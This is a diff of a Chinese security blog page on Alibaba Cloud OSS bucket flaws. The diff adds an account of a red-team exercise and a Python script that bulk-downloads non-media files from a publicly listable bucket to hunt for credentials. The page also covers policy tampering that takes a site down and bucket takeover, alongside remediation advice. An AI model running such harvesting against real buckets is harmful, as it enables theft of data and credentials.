@@ -47,7 +47,7 @@
 <meta property="og:image" content="https://s2.loli.net/2024/10/22/UjHAIzFkhqBVvoE.png">
 <meta property="og:image" content="https://s2.loli.net/2024/10/22/spYA8vGgPEjLcbq.png">
 <meta property="article:published_time" content="2024-07-16T07:43:54.000Z">
-<meta property="article:modified_time" content="2024-10-22T08:14:54.632Z">
+<meta property="article:modified_time" content="2024-10-30T06:44:08.640Z">
 <meta property="article:author" content="X1ly?S">
 <meta property="article:tag" content="OSS存储桶漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -290,7 +290,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          3.4k 字
         
       </span>
     
@@ -301,7 +301,7 @@
         
         
         
-          26 分钟
+          29 分钟
         
       </span>
     
@@ -351,7 +351,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年10月22日 下午
+                    本文最后更新于 2024年10月30日 下午
                   
                 
               </p>
@@ -392,7 +392,7 @@
 <p>如果配置为公共读&#x2F;公共读写，那么所有人可以不用经过身份验证就可以访问存储桶的数据</p>
 <p><img src="https://s2.loli.net/2024/10/22/UZXNdxYqGf3vmI2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <h3 id="oss凭证泄露"><a href="#oss凭证泄露" class="headerlink" title="oss凭证泄露"></a>oss凭证泄露</h3><ul>
-<li>可以直接看这篇文章</li>
+<li>可以直接看我博客这篇文章</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://x1lys.github.io/2024/07/12/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/">https://x1lys.github.io/2024/07/12/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/</a></p>
 <h3 id="OSS存储桶路径列出"><a href="#OSS存储桶路径列出" class="headerlink" title="OSS存储桶路径列出"></a>OSS存储桶路径列出</h3><ol>
@@ -467,7 +467,6 @@
 </ul>
 <h4 id="案例解释"><a href="#案例解释" class="headerlink" title="案例解释"></a>案例解释</h4><h5 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h5><ol>
 <li><p>域名绑定和存储桶删除</p>
-<p>：</p>
 <ul>
 <li>管理员将一个域名（如 <code>example.com</code>）通过 CNAME 记录绑定到一个 OSS 存储桶（如 <code>my-bucket</code>）。</li>
 <li>管理员删除了存储桶 <code>my-bucket</code>，但没有删除域名解析中的 CNAME 记录。</li>
@@ -524,7 +523,11 @@
 <p><img src="https://s2.loli.net/2024/10/22/UjHAIzFkhqBVvoE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <h3 id="修改策略导致网站瘫痪"><a href="#修改策略导致网站瘫痪" class="headerlink" title="修改策略导致网站瘫痪"></a>修改策略导致网站瘫痪</h3><p>还是当策略可写的时候，除了上面的将可原本不可访问的数据设置为可访问从而获得敏感数据外，如果目标网站引用了某个存储桶上的资源文件，而且我们可以对该策略进行读写的话，也可以将原本可访问的资源权限设置为不可访问，这样就会使得该图片，js资源无法被加载到网站，导致网站瘫痪了。</p>
 <p><img src="https://s2.loli.net/2024/10/22/spYA8vGgPEjLcbq.png" srcset="/img/loading.gif" lazyload alt="image"></p>
-<h3 id="漏洞修复与防御"><a href="#漏洞修复与防御" class="headerlink" title="漏洞修复与防御"></a>漏洞修复与防御</h3><h4 id="常见漏洞修复"><a href="#常见漏洞修复" class="headerlink" title="常见漏洞修复"></a>常见漏洞修复</h4><h5 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a><strong>未授权访问</strong></h5><ul>
+<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p>我在一次hvv中，就遇到了OSS公开访问并存在存储路径列出的漏洞，当时列出的文件特别多，浏览器都卡爆了，但是大部分都是非敏感的图片文件，其他文件不多，但是手动找也很费劲，于是为了找敏感信息，我就写了个脚本，访问并下载指定后缀的文件到本地，最终经过一顿乱翻，终于找到了xxxxxxx.txt文件，得到了一个系统的URL和SSO账号密码！而且这个系统是整个省的某个主系统，控制着该省每一个市的子系统，权限很高……进一步测试了下，没发现漏洞，系统的数据也不算敏感数据，于是就只拿了SSO权限分</p>
+<p>这是当时的小脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 配置</span><br><br>BASE_URL = <span class="hljs-string">&quot;http://xxxxxxx.com&quot;</span> <span class="hljs-comment"># 目标url</span><br><br>EXCLUDED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;mp3&#x27;</span>, <span class="hljs-string">&#x27;mp4&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>&#125; <span class="hljs-comment"># 不需要的文件后缀</span><br>DOWNLOAD_DIR = <span class="hljs-string">&#x27;./downloaded_files/&#x27;</span><br><br><span class="hljs-comment"># 确保下载目录存在</span><br>os.makedirs(DOWNLOAD_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_links</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; 获取文件链接 &quot;&quot;&quot;</span><br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">f&quot;Failed to retrieve the page: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br>    content = response.text<br>    <span class="hljs-comment"># 使用 lxml 的 XML 解析器</span><br>    soup = BeautifulSoup(content, <span class="hljs-string">&#x27;lxml-xml&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 解析文件路径</span><br>    keys = []<br>    <span class="hljs-keyword">for</span> key_tag <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-string">&#x27;Key&#x27;</span>):<br>        key = key_tag.text<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(key.lower().endswith(ext) <span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> EXCLUDED_EXTENSIONS):<br>            keys.append(key)<br>    <br>    <span class="hljs-keyword">return</span> keys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">url, file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; 下载文件到指定路径 &quot;&quot;&quot;</span><br>    response = requests.get(url, stream=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> response.iter_content(chunk_size=<span class="hljs-number">8192</span>):<br>                file.write(chunk)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to download <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 获取符合条件的文件路径</span><br>    file_paths = get_file_links(BASE_URL)<br>    <br>    <span class="hljs-keyword">for</span> file_path <span class="hljs-keyword">in</span> file_paths:<br>        file_url = BASE_URL + file_path<br>        local_file_path = os.path.join(DOWNLOAD_DIR, os.path.basename(file_path))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Downloading <span class="hljs-subst">&#123;file_url&#125;</span> to <span class="hljs-subst">&#123;local_file_path&#125;</span>&quot;</span>)<br>        download_file(file_url, local_file_path)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a><strong>未授权访问</strong></h3><ul>
 <li><strong>描述</strong>：存储桶和对象的访问权限配置不当，导致未授权用户可以访问敏感数据。</li>
 <li>修复与防御<ul>
 <li>确保存储桶和对象的权限配置正确，仅允许授权用户访问。</li>
@@ -533,7 +536,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="公开存储桶"><a href="#公开存储桶" class="headerlink" title="公开存储桶"></a><strong>公开存储桶</strong></h5><ul>
+<h3 id="公开存储桶"><a href="#公开存储桶" class="headerlink" title="公开存储桶"></a><strong>公开存储桶</strong></h3><ul>
 <li><p><strong>描述</strong>：存储桶被错误配置为公开访问，任何人都可以读取存储桶中的内容。</p>
 </li>
 <li><p>修复与防御</p>
@@ -545,7 +548,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="CORS-漏洞"><a href="#CORS-漏洞" class="headerlink" title="CORS 漏洞"></a><strong>CORS 漏洞</strong></h5><ul>
+<h3 id="CORS-漏洞"><a href="#CORS-漏洞" class="headerlink" title="CORS 漏洞"></a><strong>CORS 漏洞</strong></h3><ul>
 <li><p><strong>描述</strong>：跨域资源共享（CORS）配置不当，导致数据泄露或被恶意网站利用。</p>
 </li>
 <li><p>修复与防御</p>
@@ -562,7 +565,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="存储桶劫持"><a href="#存储桶劫持" class="headerlink" title="存储桶劫持"></a><strong>存储桶劫持</strong></h5><ul>
+<h3 id="存储桶劫持"><a href="#存储桶劫持" class="headerlink" title="存储桶劫持"></a><strong>存储桶劫持</strong></h3><ul>
 <li><strong>描述</strong>：由于 CNAME 解析错误或存储桶名称被删除重建，导致存储桶被恶意用户接管。</li>
 <li>修复与防御<ul>
 <li>删除存储桶时，确保相应的 CNAME 记录也被删除。</li>
@@ -571,19 +574,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="未加密的数据"><a href="#未加密的数据" class="headerlink" title="未加密的数据"></a><strong>未加密的数据</strong></h5><ul>
-<li><p><strong>描述</strong>：存储在 OSS 上的数据未加密，存在被截获或泄露的风险。</p>
-</li>
-<li><p>修复与防御</p>
-<ul>
-<li><p>启用服务器端加密（SSE），确保数据在存储时被加密。</p>
-</li>
-<li><p>使用阿里云 CLI 启用 SSE：</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">aliyun</span> <span class="hljs-string">oss</span> <span class="hljs-built_in">set-bucket-encryption</span> <span class="hljs-built_in">--bucket-name</span> &lt;<span class="hljs-string">your-bucket-name</span>&gt; <span class="hljs-built_in">--encryption-configuration</span> <span class="hljs-string">&#x27;&#123;&quot;SSEAlgorithm&quot;:&quot;KMS&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过以下措施可以有效防御和修复 OSS 配置中的常见漏洞：</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过以下措施可以有效防御和修复 OSS 配置中的常见漏洞：</p>
 <ol>
 <li>定期审查和更新存储桶策略和 ACL。</li>
 <li>确保存储桶默认设置为私有，并检查公开访问的存储桶。</li>
@@ -592,8 +583,7 @@
 <li>启用服务器端加密，确保数据在存储时被加密。</li>
 </ol>
 <blockquote>
-<p>有些简单的东西就直接照搬了这篇文章：<a target="_blank" rel="noopener" href="https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss">https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss</a></p>
-<p>若侵权请联系QQ，立改：2382247834</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss">https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_oss</a></p>
 </blockquote>
 
                 
